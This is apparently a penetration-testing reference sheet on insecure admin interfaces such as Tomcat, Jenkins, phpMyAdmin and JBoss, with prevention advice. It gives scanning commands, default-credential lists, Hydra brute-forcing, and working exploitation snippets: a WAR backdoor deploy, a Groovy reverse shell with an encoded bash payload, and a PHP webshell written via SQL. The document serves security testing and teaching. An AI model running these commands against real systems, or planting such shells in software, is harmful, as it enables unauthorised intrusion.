# Insecure Management Interface

## Description
Management interfaces provide administrative access to systems, applications, and network devices. When these interfaces lack proper security controls, use default credentials, or are exposed to the internet, they become critical vulnerabilities.

## Common Management Interfaces

### Web Application Panels
```
/admin
/administrator
/wp-admin (WordPress)
/phpmyadmin
/adminer
/manager (Tomcat)
/console (WebLogic)
/admin-console (JBoss)
```

### Network Devices
```
- Router admin panels
- Switch management interfaces
- Firewall configuration pages
- Load balancer dashboards
- VPN management consoles
```

### Database Interfaces
```
- phpMyAdmin
- Adminer
- pgAdmin
- MongoDB Compass
- Redis Commander
```

### Server Management
```
- cPanel/WHM
- Plesk
- Webmin
- Cockpit
- iLO/iDRAC/IPMI
```

### Cloud/Container
```
- Kubernetes Dashboard
- Docker Portainer
- Jenkins
- GitLab
- Grafana
```

## Discovery Techniques

### Using Nuclei
```bash
# Scan for default logins
nuclei -t http/default-logins -u https://target.com

# Scan for exposed panels
nuclei -t http/exposed-panels -u https://target.com

# Scan for exposed configurations
nuclei -t http/exposures -u https://target.com

# Combined scan
nuclei -t http/default-logins,http/exposed-panels -u https://target.com
```

### Using Nmap
```bash
# Web interface discovery
nmap -sV --script http-enum -p 80,443,8080,8443 target.com

# Management port scan
nmap -sV -p 22,23,80,161,443,3389,8080,8443,9090 target.com
```

### Directory Bruteforcing
```bash
# Common admin paths
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Specific wordlist for admin panels
ffuf -w admin-panels.txt -u https://target.com/FUZZ
```

## Default Credentials

### Common Username/Password Combinations
```
admin:admin
admin:password
admin:123456
administrator:administrator
root:root
root:toor
admin:
test:test
guest:guest
user:user
```

### Vendor-Specific Defaults

#### Tomcat
```
admin:admin
tomcat:tomcat
manager:manager
admin:s3cret
```

#### JBoss
```
admin:admin
```

#### WebLogic
```
weblogic:weblogic
system:weblogic
```

#### Cisco
```
cisco:cisco
admin:cisco
```

#### Jenkins
```
No authentication by default (older versions)
admin:admin
```

#### Grafana
```
admin:admin
```

#### MongoDB
```
No authentication by default
```

#### Redis
```
No authentication by default
```

### Default Credential Resources
```
- https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
- https://cirt.net/passwords
- https://www.defaultpassword.com/
```

## Vulnerability Types

### 1. No Authentication
```bash
# Interface accessible without login
curl https://target.com/admin
# Returns admin panel directly
```

### 2. Default Credentials
```bash
# Test common defaults
curl -X POST https://target.com/login \
    -d "username=admin&password=admin"
```

### 3. Weak Authentication
```
- Basic auth over HTTP
- Predictable session tokens
- No account lockout
- No MFA
```

### 4. Public Internet Exposure
```bash
# Management interface on public IP
# Should be internal only
shodan search "product:tomcat http.title:manager"
```

### 5. Unencrypted Communication
```bash
# HTTP instead of HTTPS
# Credentials transmitted in plaintext
```

## Exploitation Techniques

### Tomcat Manager
```bash
# Deploy WAR backdoor
curl -u tomcat:tomcat "http://target:8080/manager/text/deploy?path=/shell" \
    --upload-file shell.war

# Access shell
curl http://target:8080/shell/cmd.jsp?cmd=id
```

### Jenkins Script Console
```groovy
// Groovy reverse shell
def cmd = "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}"
def proc = cmd.execute()
proc.waitFor()
```

### phpMyAdmin
```bash
# If accessible, can execute SQL
# Write webshell
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

### JBoss/WildFly
```bash
# Deploy malicious application
curl http://target:9990/management \
    --digest -u admin:admin \
    -d '{"operation":"add","address":[{"deployment":"shell.war"}]}'
```

### Kubernetes Dashboard
```bash
# If exposed without auth
# Create privileged pod for host access
```

## Testing Checklist

### Discovery
- [ ] Scan for common management ports
- [ ] Enumerate common admin paths
- [ ] Check for exposed panels with Nuclei
- [ ] Search Shodan/Censys for exposed interfaces

### Authentication
- [ ] Test default credentials
- [ ] Check for authentication bypass
- [ ] Test for weak/predictable passwords
- [ ] Check for account lockout
- [ ] Verify HTTPS is enforced

### Authorization
- [ ] Test for vertical privilege escalation
- [ ] Check role-based access controls
- [ ] Test for function-level access control

### Configuration
- [ ] Check for verbose error messages
- [ ] Look for exposed configuration files
- [ ] Check for debug modes enabled
- [ ] Verify secure headers present

## Tools

### Default Credential Testing
```bash
# Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS target.com
run

# Hydra
hydra -L users.txt -P passwords.txt target.com http-post-form \
    "/admin/login:username=^USER^&password=^PASS^:Invalid"

# Nmap
nmap --script http-default-accounts -p 80,8080 target.com
```

### Panel Discovery
```bash
# Aquatone
cat urls.txt | aquatone

# EyeWitness
eyewitness -f urls.txt --web
```

## Prevention

### Network Level
```
1. Place management interfaces on internal networks
2. Use VPN for remote access
3. Implement firewall rules
4. Use network segmentation
```

### Application Level
```
1. Change default credentials immediately
2. Implement strong password policies
3. Enable MFA
4. Use HTTPS only
5. Implement account lockout
6. Regular security audits
```

### Monitoring
```
1. Log all authentication attempts
2. Alert on failed logins
3. Monitor for unusual activity
4. Regular credential rotation
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Management%20Interface
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
